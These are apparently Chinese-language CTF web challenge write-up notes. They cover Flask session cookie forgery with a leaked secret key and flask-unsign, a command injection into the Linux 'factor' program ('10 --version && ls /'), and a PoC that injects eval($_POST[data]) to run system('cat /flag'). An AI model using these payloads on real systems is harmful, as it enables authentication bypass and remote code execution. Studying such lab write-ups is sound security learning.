# flask?jwt?
	- 看到
		- ```
		  © C4skg 有问题请发送邮件至 adm1n@flag.com
		  ```
	- 看到changepasswd界面有注释flask secret, 伪造cookie即可
- # flask?jwt?(hard)
	- 看到`/`页面的注释提示`<!-- 我der密钥去哪里了，哦！源来氏被 /wor 藏起来了 -->`
	- 访问`/wor`，显示当前用户的登陆时间
	- 查看cookie发现登陆时间存储在cookie中
	- 清除cookie访问`/wor`发生报错，发现key存储在源码中
		- ```python
		  app.secret_key = 'hardgam3_C0u1d_u_f1ndM3????';
		  @app.route('/wor')
		  def wor():
		      loginTime = session.get('time');
		      if not loginTime:
		          return '' % loginTime; #用这种方式唤醒 debug，看看到底哪里出了问题，怎么会没有登录时间呢？？
		      else:
		          return '哼，我不会告诉你我藏哪里了，但是不能什么都不跟你说吧？哎，告诉你上次的登录时间吧: %s' % loginTime;
		  ```
	- 使用 [[CTFWEB/Flask-Unsign]]伪造cookie即可
		- ```shell
		  flask-unsign -s --secret 'hardgam3_C0u1d_u_f1ndM3????' -c "{'_fresh': True, '_id': '56bbc672f2c9802cba4fb5e9f1bb32cac18687858b06381395d99761996d0e4bcf8c1259e508de9ea4c06d908514909f48f6dc8db665d2abb4e47d0468166956', '_user_id': '1'}"
		  ```
	-
- # 信息收集
	- > 未解出，施工中
	- 看到index.php
	- apache设置`/usr/local/apache2/conf/httpd.conf`
		- ```
		  <VirtualHost *:80>
		  
		      ServerName localhost
		      DocumentRoot /usr/local/apache2/htdocs
		  
		      RewriteEngine on
		      RewriteRule "^/nssctf/(.*)" "http://backend-server:8080/index.php?id=$1" [P]
		      ProxyPassReverse "/nssctf/" "http://backend-server:8080/"
		  
		  </VirtualHost>
		  ```
- # ez_factor
	- 提示linux原生分解质因数程序，搜索得到linux自带的分解质因数程序`factor`
	- 猜测为shell RCE
	- 测试
		- `GET /factors/%2010%20--version HTTP/1.1`
			- 打印版本信息
		- `GET /factors/%2010%20--version%20%26%26%20ls%20%2f HTTP/1.1`
			- 只有数字，貌似所有字母都被过滤了
	- 结论：直接使用` 10 --version && ls /`之类的payload, 加上urlencode后传上去即可RCE
- # MyWeb
	- 题目在解析JSON时会将所有的`]`都替换成用户的输入，我们可以利用这一点实现字符逃逸
	- 在使用以下poc后字符x逃逸出了单引号包裹之外
		- ```python
		  r = base_get(url, params = {
		      "mode": "save",
		      "value": "]"
		  })
		  r = base_get(url, params = {
		      "mode": "save",
		      "value": "x"
		  })
		  ```
	- 我们只需要将x替换成我们想要的payload即可，poc如下
		- ```python
		  r = base_get(url, params = {
		      "mode": "save",
		      "value": "]"
		  })
		  r = base_get(url, params = {
		      "mode": "save",
		      "value": "];eval($_POST[data]);//"
		  })
		  r = base_post(url, params = {
		      "mode": "read",
		  }, data = {
		      "data": "system('cat /flag');"
		  })
		  
		  print(r.text)
		  ```